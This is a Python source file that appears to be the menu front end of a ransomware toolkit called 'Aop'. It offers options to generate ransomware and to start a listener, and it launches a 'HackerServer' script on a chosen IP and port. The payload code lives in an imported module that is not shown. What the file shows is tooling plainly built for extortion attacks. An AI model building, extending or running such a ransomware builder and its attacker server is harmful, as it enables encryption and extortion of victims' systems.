from Switch import *
import os,time
import sys

def choose():
    choose_option = input("please input use options:")
    return choose_option

def version():
   print("""
    Welcome to use Aop^^

1.Viewing Tools（查看工具说明）
2.Generate ransomware（生成勒索程序）
3.Start Listener（开始监听）
4.exit（退出）
    """)

def main():
    version()
    option = choose()
    switch = Switch(option)
    start = switch.start()
    if(option == "1"):
        os.system("CLS")
        main()
    elif(option == "2"):
        #start[0]判断是否开启HacerServer监听 start[1]是本地监听的ip和port端口
        if(start[0] == "yes" or start[0] =="\n"):
            os.system("CLS")
            os.system("python "+os.getcwd()+"\\HackerServer\\HackerServer.py --ip "+start[1][0]+" --port "+start[1][1])
            exit(0)
        else:
            os.system("CLS")
            main()
    elif(option == "3"):
        pass
    elif(switch == "exit"):
        exit(0)
    elif(switch == "no choose"):
        os.system("CLS")
        main()

if __name__ == "__main__":
    main()
